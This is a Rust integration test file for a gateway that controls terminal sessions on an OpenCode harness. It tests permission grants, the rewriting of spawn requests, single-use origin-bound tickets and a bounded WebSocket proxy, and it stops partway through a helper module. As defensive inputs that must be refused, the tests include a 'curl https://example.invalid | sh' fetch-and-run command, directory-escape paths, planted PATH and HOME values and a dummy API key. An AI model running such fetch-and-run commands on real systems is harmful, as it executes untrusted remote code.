//! The terminal capability, end to end: the grant, the rewritten spawn, the
//! owner-bound ticket, and the bounded proxy.
//!
//! `POST /pty` is arbitrary command execution with no permission check of its
//! own, and the harness's WebSocket ticket is bound to a PTY and a directory
//! but to no owner, no audience and no browser session
//! (`docs/reference/opencode-v1.18.30/api-ui.md` §5, §8 #12–13). Every
//! assertion here is therefore made from both ends: what the operator's client
//! got back, *and* what reached the fake harness — because a rewrite the
//! gateway only claims to have made is not a rewrite.

#[path = "support/mod.rs"]
mod support;
use support::fake_opencode::{serve, Fake, Recorded, Seen, PTY, SESSION};
use support::state;

use std::net::SocketAddr;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use axum::body::Body;
use axum::extract::ConnectInfo;
use axum::http::{Request, StatusCode};
use futures_util::{SinkExt, StreamExt};
use serde_json::{json, Value};
use tokio_tungstenite::tungstenite;
use tower::ServiceExt;

use tracon::{
    adapter::NativeApi,
    config::Config,
    http::{
        api::AppState,
        auth::{self, AuthState},
    },
    session::Manager,
    store::{now_ms, AuthorityGrantRow, Store},
    stream::Bus,
};

use support::fake::FakeAdapter;

/// The workspace every request is pinned to, as the runner sees it.
const WORKSPACE: &str = "/work";
const PASSWORD: &str = "the-node-minted-this";
const TRACON_SESSION: &str = "s-terminal";
const CHANNEL: &str = "personal";
const LOCAL: &str = "127.0.0.1:5000";

struct Rig {
    app: axum::Router,
    store: Arc<Store>,
    seen: Arc<Mutex<Seen>>,
    /// Where the operator router really listens, because a WebSocket upgrade
    /// cannot be driven through `oneshot`: it needs a socket to take over.
    addr: SocketAddr,
}

impl Rig {
    async fn new() -> Self {
        Self::with(Fake::new("1.18.30", usize::MAX), Config::default()).await
    }

    async fn with(fake: Fake, mut cfg: Config) -> Self {
        state::isolate();
        let seen = fake.seen.clone();
        *fake.password.lock().unwrap() = PASSWORD.to_string();
        let endpoint = serve(fake).await;

        let store = Arc::new(Store::open_in_memory().unwrap());
        store.ensure_peer_node("n1").unwrap();
        cfg.session.worktree_root = state::scratch("opencode-pty").join("worktrees");
        let cfg = Arc::new(cfg);
        let tools = Arc::new(tracon::mcp::Tools {
            broker: Arc::new(Default::default()),
            cfg: cfg.clone(),
            policy: tracon::policy::Policy::shipped_shared(),
            http: reqwest::Client::new(),
            session: Default::default(),
        });
        let manager = Manager::new(
            store.clone(),
            Bus::new(),
            cfg.clone(),
            "n1".into(),
            tools.clone(),
            Default::default(),
            Arc::new(tracon::runner::local::LocalBackend),
        );
        let state = AppState {
            manager: manager.clone(),
            cfg,
            adapter: Arc::new(FakeAdapter {
                tx: Arc::new(tokio::sync::Mutex::new(None)),
                tokens: Arc::new(tokio::sync::Mutex::new(0)),
            }),
            node_id: "n1".into(),
            tools,
            mesh: None,
            auth: Arc::new(AuthState::new("127.0.0.1".into(), None)),
            enroll: Default::default(),
        };
        let app = tracon::http::router(state.clone())
            .layer(axum::middleware::from_fn_with_state(state, auth::guard));

        let mut row = support::rows::session_row(TRACON_SESSION, "n1", CHANNEL);
        row.harness_id = "opencode".into();
        row.harness_session_id = Some(SESSION.into());
        store.insert_session(&row).unwrap();
        manager
            .register_native_api_for_test(TRACON_SESSION, native_api(endpoint))
            .await;

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let served = app.clone();
        tokio::spawn(async move {
            let _ = axum::serve(
                listener,
                served.into_make_service_with_connect_info::<SocketAddr>(),
            )
            .await;
        });

        Self {
            app,
            store,
            seen,
            addr,
        }
    }

    async fn call(&self, method: &str, tail: &str, body: Option<Value>) -> (StatusCode, Value) {
        self.call_with(method, tail, body, &[]).await
    }

    async fn call_with(
        &self,
        method: &str,
        tail: &str,
        body: Option<Value>,
        headers: &[(&str, &str)],
    ) -> (StatusCode, Value) {
        let mut b = Request::builder()
            .method(method)
            .uri(format!("/api/opencode/{TRACON_SESSION}/{tail}"))
            .header("host", "127.0.0.1:7420");
        for (k, v) in headers {
            b = b.header(*k, *v);
        }
        if body.is_some() {
            b = b.header("content-type", "application/json");
        }
        let mut req = b
            .body(match body {
                Some(v) => Body::from(v.to_string()),
                None => Body::empty(),
            })
            .unwrap();
        req.extensions_mut()
            .insert(ConnectInfo(LOCAL.parse::<SocketAddr>().unwrap()));
        let res = self.app.clone().oneshot(req).await.unwrap();
        let status = res.status();
        let bytes = axum::body::to_bytes(res.into_body(), 1 << 20)
            .await
            .unwrap();
        let text = String::from_utf8_lossy(&bytes).to_string();
        (
            status,
            serde_json::from_str(&text).unwrap_or(Value::String(text)),
        )
    }

    /// Ask for a terminal ticket the way a browser would, from one origin.
    async fn ticket(&self, pty: &str, origin: &str) -> (StatusCode, Value) {
        self.call_with(
            "POST",
            &format!("pty/{pty}/connect-token"),
            Some(json!({})),
            &[("origin", origin)],
        )
        .await
    }

    fn requests(&self) -> Vec<Recorded> {
        self.seen.lock().unwrap().requests.clone()
    }

    fn forget_requests(&self) {
        self.seen.lock().unwrap().requests.clear();
    }

    fn spawns(&self) -> Vec<Value> {
        self.seen.lock().unwrap().spawns.clone()
    }

    fn events_of(&self, kind: &str) -> Vec<Value> {
        self.store
            .events_after(TRACON_SESSION, 0, 500)
            .unwrap()
            .into_iter()
            .filter(|e| e.kind == kind)
            .map(|e| e.payload)
            .collect()
    }

    /// The grant an operator makes from the queue card or from Settings:
    /// bound to this channel, this session, and this session's workspace,
    /// with an expiry.
    fn grant(&self) {
        self.grant_for(TRACON_SESSION, WORKSPACE, CHANNEL, Some(TRACON_SESSION));
    }

    fn grant_for(
        &self,
        target_session: &str,
        workspace: &str,
        channel: &str,
        bound: Option<&str>,
    ) -> String {
        let row = AuthorityGrantRow {
            id: uuid::Uuid::now_v7().to_string(),
            action: "terminal".into(),
            verdict: "allow".into(),
            target: tracon::authority::terminal_target(target_session, workspace),
            channel: channel.into(),
            session_id: bound.map(str::to_string),
            revision: None,
            expires_ms: Some(now_ms() + 600_000),
            revoked_ms: None,
            reason: "the operator opened a terminal for this session".into(),
            created_ms: now_ms(),
        };
        self.store.authority_grant_insert(&row).unwrap();
        row.id
    }

    /// Open the proxied terminal as a browser would: a ticket in the query, an
    /// `Origin` the ticket was minted for, and a loopback `Host`.
    async fn connect(
        &self,
        pty: &str,
        ticket: &str,
        origin: &str,
    ) -> Result<
        tokio_tungstenite::WebSocketStream<
            tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
        >,
        tungstenite::Error,
    > {
        use tungstenite::client::IntoClientRequest;
        let url = format!(
            "ws://{}/api/opencode/{TRACON_SESSION}/pty/{pty}/connect?ticket={ticket}",
            self.addr
        );
        let mut request = url.into_client_request().unwrap();
        request
            .headers_mut()
            .insert("origin", origin.parse().unwrap());
        tokio_tungstenite::connect_async(request)
            .await
            .map(|(socket, _)| socket)
    }

    fn origin(&self) -> String {
        format!("http://{}", self.addr)
    }
}

fn native_api(endpoint: SocketAddr) -> NativeApi {
    use base64::Engine;
    let credential =
        base64::engine::general_purpose::STANDARD.encode(format!("opencode:{PASSWORD}"));
    NativeApi {
        base: format!("http://{endpoint}"),
        authorization: format!("Basic {credential}"),
        directory: WORKSPACE.into(),
        session_id: SESSION.into(),
    }
}

fn status_of(e: &tungstenite::Error) -> Option<StatusCode> {
    match e {
        tungstenite::Error::Http(response) => Some(response.status()),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// 1. The grant
// ---------------------------------------------------------------------------

/// Default-deny, and the refusal is something the operator can act on: it
/// names the capability, the channel, the target a grant has to bind, and the
/// thing about a PTY that makes the default what it is. Nothing is spawned.
#[tokio::test]
async fn without_a_grant_no_terminal_route_reaches_the_harness() {
    let rig = Rig::new().await;
    for (method, tail) in [
        ("POST", "pty".to_string()),
        ("POST", "api/pty".to_string()),
        ("GET", format!("pty/{PTY}")),
        ("DELETE", format!("pty/{PTY}")),
        ("POST", format!("pty/{PTY}/connect-token")),
    ] {
        let (status, body) = rig
            .call(method, &tail, Some(json!({ "command": "/bin/bash" })))
            .await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{method} /{tail}: {body}");
        let message = body["error"]["message"].as_str().unwrap_or_default();
        assert!(message.contains("terminal"), "{message}");
        assert!(
            message.contains(&tracon::authority::terminal_target(
                TRACON_SESSION,
                WORKSPACE
            )),
            "the refusal must name the target a grant has to bind: {message}"
        );
        assert!(
            message.contains("interactive shell") && message.contains("per-command ledger"),
            "the refusal must say what a terminal grant actually is: {message}"
        );
    }
    assert!(
        rig.requests().is_empty(),
        "nothing may reach the harness: {:?}",
        rig.requests()
    );
    assert!(rig.spawns().is_empty());
    assert_eq!(rig.events_of("gateway_refused").len(), 5);
    assert!(rig.events_of("pty_opened").is_empty());
}

/// A grant is bound to a session and to that session's workspace path. One
/// made for another session, for another workspace, or for another channel is
/// not this terminal's, and neither is one that names no session at all — the
/// binding is the whole point.
#[tokio::test]
async fn a_grant_opens_only_the_session_and_workspace_it_names() {
    for (session, workspace, channel, bound) in [
        ("s-someone-else", WORKSPACE, CHANNEL, Some("s-someone-else")),
        (TRACON_SESSION, "/etc", CHANNEL, Some(TRACON_SESSION)),
        (
            TRACON_SESSION,
            WORKSPACE,
            "another-channel",
            Some(TRACON_SESSION),
        ),
        // On the right target and channel, but bound to no session: it would
        // outlive the session it was made for.
        (TRACON_SESSION, WORKSPACE, CHANNEL, None),
    ] {
        let rig = Rig::new().await;
        rig.grant_for(session, workspace, channel, bound);
        let (status, body) = rig
            .call("POST", "pty", Some(json!({ "command": "/bin/bash" })))
            .await;
        assert_eq!(
            status,
            StatusCode::FORBIDDEN,
            "a grant for ({session}, {workspace}, {channel}, {bound:?}) must not open this terminal: {body}"
        );
        assert!(rig.spawns().is_empty());
    }
}

/// Revocation takes effect at the next dispatch, not at the next poll: the
/// grant is read at the moment the call is made.
#[tokio::test]
async fn revoking_a_grant_closes_the_capability_immediately() {
    let rig = Rig::new().await;
    let id = rig.grant_for(TRACON_SESSION, WORKSPACE, CHANNEL, Some(TRACON_SESSION));
    let (status, _) = rig
        .call("POST", "pty", Some(json!({ "command": "/bin/bash" })))
        .await;
    assert_eq!(status, StatusCode::OK);

    assert!(rig.store.authority_grant_revoke(&id).unwrap());
    let (status, body) = rig
        .call("POST", "pty", Some(json!({ "command": "/bin/bash" })))
        .await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    assert_eq!(rig.spawns().len(), 1, "the second spawn must not have run");
}

// ---------------------------------------------------------------------------
// 2. The mediated spawn
// ---------------------------------------------------------------------------

/// Every field of a spawn is tracon's, not the caller's. The assertion is on
/// what reached the fake: the directory it was told, the command it was told,
/// and an environment with nothing in it that decides what the shell can
/// reach.
#[tokio::test]
async fn a_spawn_is_rewritten_before_it_is_sent() {
    let rig = Rig::new().await;
    rig.grant();
    let (status, body) = rig
        .call(
            "POST",
            "pty",
            Some(json!({
                "command": "/bin/bash",
                "args": ["-i"],
                "cwd": "/work//src/./deep",
                "title": "a terminal",
                "env": {
                    "TERM": "xterm-256color",
                    "PATH": "/work/.planted:/usr/bin",
                    "HOME": "/work/planted",
                    "ANTHROPIC_API_KEY": "sk-must-not-travel",
                },
            })),
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let spawns = rig.spawns();
    assert_eq!(spawns.len(), 1, "{spawns:?}");
    let sent = &spawns[0];
    assert_eq!(sent["command"], "/bin/bash");
    assert_eq!(sent["args"], json!(["-i"]));
    // Normalised, and still under the workspace.
    assert_eq!(sent["cwd"], "/work/src/deep");
    assert_eq!(sent["env"], json!({ "TERM": "xterm-256color" }));
    assert!(
        !sent.to_string().contains("sk-must-not-travel"),
        "a caller-supplied credential must not reach the spawn: {sent}"
    );
    assert!(
        !sent.to_string().contains("planted"),
        "a caller-supplied PATH or HOME must not reach the spawn: {sent}"
    );

    // And the event says what was opened, by whose grant, and what a terminal
    // grant does not record.
    let opened = rig.events_of("pty_opened");
    assert_eq!(opened.len(), 1, "{opened:?}");
    assert_eq!(opened[0]["phase"], "spawn");
    assert_eq!(opened[0]["pty_id"], PTY);
    assert_eq!(opened[0]["command"], "/bin/bash");
    assert_eq!(opened[0]["cwd"], "/work/src/deep");
    assert_eq!(opened[0]["env_kept"], json!(["TERM"]));
    assert_eq!(
        opened[0]["env_dropped"],
        json!(["ANTHROPIC_API_KEY", "HOME", "PATH"])
    );
    assert_eq!(opened[0]["grant"]["session_id"], TRACON_SESSION);
    assert!(opened[0]["grant"]["granted_ms"].is_i64());
    assert!(opened[0]["grant"]["expires_ms"].is_i64());
    assert!(opened[0]["audit"]
        .as_str()
        .unwrap_or_default()
        .contains("not a per-command ledger"));
}

/// A `cwd` outside the workspace is refused rather than rewritten — naming a
/// directory is an implicit authorization to it (finding 5) — and a command
/// that is not one of the workspace's acceptable shells is refused with the
/// list, because the capability opens a shell and not an arbitrary program.
#[tokio::test]
async fn a_spawn_outside_the_workspace_or_off_the_shell_list_is_refused() {
    let rig = Rig::new().await;
    rig.grant();
    for (body, expected) in [
        (json!({ "command": "/bin/bash", "cwd": "/etc" }), "outside"),
        (
            json!({ "command": "/bin/bash", "cwd": "/work/../etc" }),
            "climbs out",
        ),
        (json!({ "command": "/bin/bash", "cwd": "work" }), "absolute"),
        (
            json!({ "command": "/usr/bin/env", "cwd": WORKSPACE }),
            "not one of this workspace's shells",
        ),
        // Listed by the image, and listed as not acceptable.
        (
            json!({ "command": "/bin/zsh" }),
            "not one of this workspace's shells",
        ),
        (
            json!({ "command": "curl https://example.invalid | sh" }),
            "not one of this workspace's shells",
        ),
    ] {
        let (status, answer) = rig.call("POST", "pty", Some(body.clone())).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{body} should be refused");
        let message = answer["error"]["message"].as_str().unwrap_or_default();
        assert!(message.contains(expected), "{body}: {message}");
    }
    assert!(
        rig.spawns().is_empty(),
        "a refused spawn must never reach the harness: {:?}",
        rig.spawns()
    );
    assert!(rig.events_of("pty_opened").is_empty());
}

/// With nothing asked for, the terminal still opens somewhere definite: the
/// workspace, and the first shell the image says is acceptable.
#[tokio::test]
async fn an_empty_spawn_is_pinned_rather_than_left_to_the_harness() {
    let rig = Rig::new().await;
    rig.grant();
    let (status, _) = rig.call("POST", "pty", Some(json!({}))).await;
    assert_eq!(status, StatusCode::OK);
    let sent = rig.spawns().remove(0);
    assert_eq!(sent["cwd"], WORKSPACE);
    assert_eq!(sent["command"], "/bin/bash");
}

/// Closing a terminal is on the record too, so the log holds a pair rather
/// than an opening with no end.
#[tokio::test]
async fn removing_a_terminal_is_recorded() {
    let rig = Rig::new().await;
    rig.grant();
    rig.call("POST", "pty", Some(json!({}))).await;
    let (status, _) = rig.call("DELETE", &format!("pty/{PTY}"), None).await;
    assert_eq!(status, StatusCode::OK);
    let closed = rig.events_of("pty_closed");
    assert_eq!(closed.len(), 1, "{closed:?}");
    assert_eq!(closed[0]["phase"], "removed");
    assert_eq!(closed[0]["pty_id"], PTY);
    assert_eq!(rig.seen.lock().unwrap().removed, vec![PTY.to_string()]);
}

// ---------------------------------------------------------------------------
// 3. The owner-bound ticket
// ---------------------------------------------------------------------------

/// The gateway takes the harness's ticket server-side, with the header the
/// harness demands, and hands back one of its own. The harness's never
/// reaches the client — which is the difference between a ticket bound to a
/// PTY and a directory and one bound to an operator, a session, a PTY and an
/// origin.
#[tokio::test]
async fn the_node_mints_its_own_ticket_and_keeps_the_harness_one() {
    let rig = Rig::new().await;
    rig.grant();
    rig.call("POST", "pty", Some(json!({}))).await;
    rig.forget_requests();

    let (status, body) = rig.ticket(PTY, &rig.origin()).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let minted = body["ticket"].as_str().expect("a ticket");
    assert!(minted.len() >= 32, "a ticket must not be guessable: {body}");
    assert_eq!(body["single_use"], true);
    assert_eq!(body["expires_in"], 30);
    assert_eq!(body["bound_to"]["session"], TRACON_SESSION);
    assert_eq!(body["bound_to"]["pty"], PTY);
    assert_eq!(body["bound_to"]["audience"], rig.origin());

    let (ticket_headers, issued) = {
        let seen = rig.seen.lock().unwrap();
        (seen.ticket_headers.clone(), seen.issued.clone())
    };
    assert_eq!(
        ticket_headers,
        vec![Some("1".to_string())],
        "the harness demands its own header on a ticket request"
    );
    assert_eq!(issued.len(), 1);
    assert_ne!(
        issued[0], minted,
        "the harness's ticket must never be what the client is handed"
    );
    assert!(
        !body.to_string().contains(&issued[0]),
        "the harness's ticket must not be anywhere in the answer: {body}"
    );
    // And the credential was still injected on the node.
    assert!(rig.requests()[0]
        .authorization
        .as_deref()
        .is_some_and(|v| v.starts_with("Basic ")));
}

/// A ticket is spent on the first upgrade, whether or not that upgrade
/// succeeds, and it opens only the PTY and the origin it was minted for.
#[tokio::test]
async fn a_ticket_is_single_use_and_bound_to_its_pty_and_origin() {
    let rig = Rig::new().await;
    rig.grant();
    rig.call("POST", "pty", Some(json!({}))).await;
    let origin = rig.origin();

    // No ticket at all.
    let refused = rig
        .connect(PTY, "", &origin)
        .await
        .expect_err("an upgrade with no ticket must be refused");
    assert_eq!(status_of(&refused), Some(StatusCode::UNAUTHORIZED));

    // Invented.
    let refused = rig
        .connect(PTY, "not-a-ticket-anyone-issued", &origin)
        .await
        .expect_err("an invented ticket must be refused");
    assert_eq!(status_of(&refused), Some(StatusCode::FORBIDDEN));

    // Minted for one origin, presented from another. Both are loopback
    // origins the harness's own check would accept (§8 #13); this one does
    // not, because it is bound to the exact origin it was minted from.
    let (_, body) = rig.ticket(PTY, &origin).await;
    let ticket = body["ticket"].as_str().unwrap().to_string();
    let elsewhere = format!("http://localhost:{}", rig.addr.port());
    let refused = rig
        .connect(PTY, &ticket, &elsewhere)
        .await
        .expect_err("a ticket presented from another origin must be refused");
    assert_eq!(status_of(&refused), Some(StatusCode::FORBIDDEN));
    // And it is spent: the right origin does not rescue it.
    let refused = rig
        .connect(PTY, &ticket, &origin)
        .await
        .expect_err("a spent ticket must be refused");
    assert_eq!(status_of(&refused), Some(StatusCode::FORBIDDEN));

    // Minted for one PTY, presented for another.
    let (_, body) = rig.ticket(PTY, &origin).await;
    let ticket = body["ticket"].as_str().unwrap().to_string();
    let refused = rig
        .connect("pty_someoneelses00000000", &ticket, &origin)
        .await
        .expect_err("a ticket for another terminal must be refused");
    assert_eq!(status_of(&refused), Some(StatusCode::FORBIDDEN));

    // A good one, used twice.
    let (_, body) = rig.ticket(PTY, &origin).await;
    let ticket = body["ticket"].as_str().unwrap().to_string();
    let socket = rig
        .connect(PTY, &ticket, &origin)
        .await
        .expect("the first use opens the terminal");
    drop(socket);
    let refused = rig
        .connect(PTY, &ticket, &origin)
        .await
        .expect_err("the second use must be refused");
    assert_eq!(status_of(&refused), Some(StatusCode::FORBIDDEN));
}

/// The capability is checked again at the upgrade, not only at the mint: a
/// grant revoked between the two does not leave a live ticket behind.
#[tokio::test]
async fn an_upgrade_rechecks_the_capability() {
    let rig = Rig::new().await;
    let id = rig.grant_for(TRACON_SESSION, WORKSPACE, CHANNEL, Some(TRACON_SESSION));
    rig.call("POST", "pty", Some(json!({}))).await;
    let origin = rig.origin();
    let (_, body) = rig.ticket(PTY, &origin).await;
    let ticket = body["ticket"].as_str().unwrap().to_string();

    assert!(rig.store.authority_grant_revoke(&id).unwrap());
    let refused = rig
        .connect(PTY, &ticket, &origin)
        .await
        .expect_err("a revoked capability must close the upgrade");
    assert_eq!(status_of(&refused), Some(StatusCode::FORBIDDEN));
}

// ---------------------------------------------------------------------------
// 4. The proxy
// ---------------------------------------------------------------------------

/// Bytes cross in both directions, the close propagates, and what is left on
/// the record is the shape of the connection — counts and a duration — rather
/// than its transcript.
#[tokio::test]
async fn bytes_are_pumped_both_ways_and_the_close_is_recorded() {
    let rig = Rig::new().await;
    rig.grant();
    rig.call("POST", "pty", Some(json!({}))).await;
    let origin = rig.origin();
    let (_, body) = rig.ticket(PTY, &origin).await;
    let ticket = body["ticket"].as_str().unwrap().to_string();

    let mut socket = rig.connect(PTY, &ticket, &origin).await.expect("connected");

    // The harness speaks first, as a shell does.
    let greeting = socket.next().await.expect("output").expect("a frame");
    assert_eq!(
        greeting.into_text().unwrap().as_str(),
        format!("{PTY} ready\n")
    );

    // And it hears the operator.
    socket
        .send(tungstenite::Message::Text("just test\n".into()))
        .await
        .unwrap();
    let echoed = socket.next().await.expect("output").expect("a frame");
    assert_eq!(echoed.into_text().unwrap().as_str(), "$ just test\n");

    socket.close(None).await.unwrap();
    // Drain until the peer's close comes back, so the proxy has finished.
    while let Some(Ok(_)) = socket.next().await {}

    let attached = rig.events_of("pty_opened");
    assert_eq!(attached.len(), 2, "{attached:?}");
    assert_eq!(attached[1]["phase"], "attach");
    assert_eq!(attached[1]["pty_id"], PTY);
    assert!(attached[1]["input_replay"]
        .as_str()
        .unwrap_or_default()
        .contains("reconnect starts fresh"));

    let closed = wait_for_close(&rig).await;
    assert_eq!(closed["phase"], "detached");
    assert_eq!(closed["pty_id"], PTY);
    assert_eq!(closed["bytes_in"], "just test\n".len());
    assert_eq!(
        closed["bytes_out"],
        format!("{PTY} ready\n").len() + "$ just test\n".len()
    );
    assert!(closed["duration_ms"].as_i64().is_some_and(|ms| ms >= 0));
    assert!(closed["reason"].as_str().is_some_and(|r| !r.is_empty()));
    // The transcript is not the record: capture is off by default, and what
    // was typed at the prompt is nowhere in the log.
    assert!(closed["output"].is_null());
    assert!(
        !closed.to_string().contains("just test"),
        "a terminal transcript is not a tool ledger: {closed}"
    );
}

/// A client that stops reading is closed with a reason, not buffered. The cap
/// is the node's, and a terminal can produce output far faster than a stalled
/// tab consumes it, so the alternative to closing is one tab holding as much
/// memory as a shell can make.
#[tokio::test]
async fn a_client_that_stops_reading_is_closed_rather_than_buffered() {
    let mut cfg = Config::default();
    cfg.session.pty_buffer_frames = 2;
    let rig = Rig::with(Fake::new("1.18.30", usize::MAX).flooding(400), cfg).await;
    rig.grant();
    rig.call("POST", "pty", Some(json!({}))).await;
    let origin = rig.origin();
    let (_, body) = rig.ticket(PTY, &origin).await;
    let ticket = body["ticket"].as_str().unwrap().to_string();

    // Connected and then never read from: 400 × 64 KiB is far more than any
    // socket buffer will absorb, so the gateway's queue is what fills.
    let socket = rig.connect(PTY, &ticket, &origin).await.expect("connected");

    let closed = wait_for_close(&rig).await;
    assert!(
        closed["reason"]
            .as_str()
            .unwrap_or_default()
            .contains("stopped reading"),
        "the close must say why: {closed}"
    );
    assert!(
        closed["bytes_out"].as_u64().unwrap_or(0) < 400 * 64 * 1024,
        "the proxy must not have swallowed the whole flood: {closed}"
    );
    drop(socket);
}

/// Output capture exists and is off. Turned on deliberately, it writes a
/// bounded tail and says in the same breath that it is not a tool ledger.
#[tokio::test]
async fn output_capture_is_opt_in_and_labelled() {
    let mut cfg = Config::default();
    cfg.session.pty_capture_output = true;
    let rig = Rig::with(Fake::new("1.18.30", usize::MAX), cfg).await;
    rig.grant();
    rig.call("POST", "pty", Some(json!({}))).await;
    let origin = rig.origin();
    let (_, body) = rig.ticket(PTY, &origin).await;
    let ticket = body["ticket"].as_str().unwrap().to_string();

    let mut socket = rig.connect(PTY, &ticket, &origin).await.expect("connected");
    socket.next().await;
    socket.close(None).await.unwrap();
    while let Some(Ok(_)) = socket.next().await {}

    let closed = wait_for_close(&rig).await;
    assert_eq!(
        closed["output"].as_str().unwrap_or_default(),
        format!("{PTY} ready\n")
    );
    assert!(closed["audit"]
        .as_str()
        .unwrap_or_default()
        .contains("not a per-command ledger"));
}

async fn wait_for_close(rig: &Rig) -> Value {
    for _ in 0..400 {
        if let Some(closed) = rig
            .events_of("pty_closed")
            .into_iter()
            .find(|e| e["phase"] == "detached")
        {
            return closed;
        }
        tokio::time::sleep(Duration::from_millis(25)).await;
    }
    panic!("the terminal connection never recorded a close");
}

// ---------------------------------------------------------------------------
// 5. The pinned binary
// ---------------------------------------------------------------------------

/// The whole path against a real `opencode serve`: an operator grant, a
/// rewritten spawn of a real shell, a ticket the node minted after taking the
/// harness's, and `ok` read back over the proxied WebSocket. Skipped with a
/// message where the pinned binary is not on this machine, because a build at
/// another version proves nothing about the release this was written against.
#[tokio::test]
async fn a_real_shell_is_spawned_and_read_back_through_the_proxy() {
    state::isolate();
    let Some(binary) = pinned_binary() else {
        eprintln!(
            "skipped: the pinned OpenCode binary is not on this machine. \
             Put it on PATH as `opencode`, or name it in TRACON_OPENCODE_BINARY."
        );
        return;
    };
    let live = live::Live::start(&binary).await;
    live.grant();

    // A shell, in the workspace, with an argument that makes it say one thing.
    // The argument is passed through and recorded; the command, the directory
    // and the environment are not the caller's. It waits after saying it
    // because the v1 PTY routes hide a session whose process has already
    // exited, and this test is about the socket, not about that.
    let (status, created) = live
        .gateway(
            "POST",
            "pty",
            Some(json!({
                "command": "/bin/sh",
                "args": ["-c", "echo ok; sleep 30"],
                "cwd": "/etc",
                "env": { "TERM": "xterm-256color", "PATH": "/nowhere" },
            })),
        )
        .await;
    // The `cwd` it named is outside the workspace, so it is refused outright.
    assert_eq!(status, StatusCode::FORBIDDEN, "{created}");

    let (status, created) = live
        .gateway(
            "POST",
            "pty",
            Some(json!({
                "command": "/bin/sh",
                "args": ["-c", "echo ok; sleep 30"],
                "env": { "TERM": "xterm-256color", "PATH": "/nowhere" },
            })),
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{created}");
    let pty_id = created["id"]
        .as_str()
        .or_else(|| created["data"]["id"].as_str())
        .expect("the harness's own pty id")
        .to_string();

    let origin = live.origin();
    let (status, body) = live
        .gateway_with(
            "POST",
            &format!("pty/{pty_id}/connect-token"),
            Some(json!({})),
            &[("origin", origin.as_str())],
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let ticket = body["ticket"]
        .as_str()
        .expect("a tracon ticket")
        .to_string();

    let mut socket = live
        .connect(&pty_id, &ticket, &origin)
        .await
        .expect("the proxied terminal opens");
    let mut heard = String::new();
    for _ in 0..40 {
        match tokio::time::timeout(Duration::from_secs(2), socket.next()).await {
            Ok(Some(Ok(message))) => {
                match message {
                    tungstenite::Message::Text(text) => heard.push_str(text.as_str()),
                    tungstenite::Message::Binary(data) => {
                        heard.push_str(&String::from_utf8_lossy(&data))
                    }
                    tungstenite::Message::Close(_) => break,
                    _ => {}
                }
                if heard.contains("ok") {
                    break;
                }
            }
            _ => break,
        }
    }
    assert!(
        heard.contains("ok"),
        "the real shell's output must come back through the proxy: {heard:?}"
    );
    let _ = socket.close(None).await;

    let opened = live.events_of("pty_opened");
    assert!(
        opened.iter().any(|e| e["phase"] == "spawn"
            && e["command"] == "/bin/sh"
            && e["cwd"] == live.workspace()
            && e["env_kept"] == json!(["TERM"])
            && e["env_dropped"] == json!(["PATH"])),
        "{opened:?}"
    );
    live.stop().await;
}

/// The pinned binary, when this machine has it: named in
/// `TRACON_OPENCODE_BINARY`, or on `PATH`. A build at another version proves
/// nothing about the release this gateway was written against, so it is
/// skipped rather than run.
fn pinned_binary() -> Option<String> {
    use tracon::adapter::opencode::OpenCodeAdapter;
    let candidate = match std::env::var_os("TRACON_OPENCODE_BINARY") {
        Some(named) => {
            let path = std::path::PathBuf::from(named);
            path.is_file()
                .then(|| path.to_string_lossy().into_owned())?
        }
        None => std::env::split_paths(&std::env::var_os("PATH")?)
            .map(|dir| dir.join("opencode"))
            .find(|candidate| candidate.is_file())
            .map(|candidate| candidate.to_string_lossy().into_owned())?,
    };
    let reported = std::process::Command::new(&candidate)
        .arg("--version")
        .output()
        .ok()?;
    let reported = String::from_utf8_lossy(&reported.stdout).trim().to_string();
    if reported != OpenCodeAdapter::PINNED_VERSION {
        eprintln!(
            "skipped: {candidate} reports {reported}, not the pinned {}",
            OpenCodeAdapter::PINNED_VERSION
        );
        return None;
    }
    Some(candidate)
}

/// One live `opencode serve`, started the way the adapter starts one, with
/// the operator router and this session's gateway mount in front of it.
mod live {
    use super::*;
    use async_trait::async_trait;
    use tracon::adapter::{opencode::OpenCodeAdapter, HarnessAdapter, HarnessHandle, LaunchSpec};
    use tracon::runner::{Runner, RunnerCommand, RunnerError, Spawned};

    pub struct Live {
        container: String,
        app: axum::Router,
        store: Arc<Store>,
        session_id: String,
        api: NativeApi,
        handle: Option<Box<dyn HarnessHandle>>,
        runner: LiveRunner,
        addr: SocketAddr,
    }

    impl Live {
        pub async fn start(binary: &str) -> Self {
            let root = state::scratch("opencode-pty-live");
            let work = root.join("work");
            std::fs::create_dir_all(&work).unwrap();

            let adapter = OpenCodeAdapter::new(OpenCodeAdapter::PINNED_VERSION);
            let wiring = wiring();
            let scratch = root.join(".opencode");
            std::fs::create_dir_all(scratch.join("run")).unwrap();
            for (file, body) in adapter.scratch_files(&wiring) {
                std::fs::write(scratch.join(&file), body).unwrap();
            }

            let container = format!("tracon-opencode-pty-{}", std::process::id());
            let runner = LiveRunner {
                binary: binary.to_string(),
            };
            let spec = LaunchSpec {
                cwd_in_runner: work.to_string_lossy().into_owned(),
                container_name: container.clone(),
                harness_home: root.to_string_lossy().into_owned(),
                ..support::fake_opencode::spec()
            };
            let (handle, _events) = adapter
                .launch(&runner, spec)
                .await
                .expect("the pinned binary starts");
            let api = handle.native_api().expect("a native API");

            let store = Arc::new(Store::open_in_memory().unwrap());
            store.ensure_peer_node("n1").unwrap();
            let cfg = Arc::new(Config::default());
            let tools = Arc::new(tracon::mcp::Tools {
                broker: Arc::new(Default::default()),
                cfg: cfg.clone(),
                policy: tracon::policy::Policy::shipped_shared(),
                http: reqwest::Client::new(),
                session: Default::default(),
            });
            let manager = Manager::new(
                store.clone(),
                Bus::new(),
                cfg.clone(),
                "n1".into(),
                tools.clone(),
                Default::default(),
                Arc::new(tracon::runner::local::LocalBackend),
            );
            let session_id = "s-pty-live".to_string();
            let mut row = support::rows::session_row(&session_id, "n1", CHANNEL);
            row.harness_id = "opencode".into();
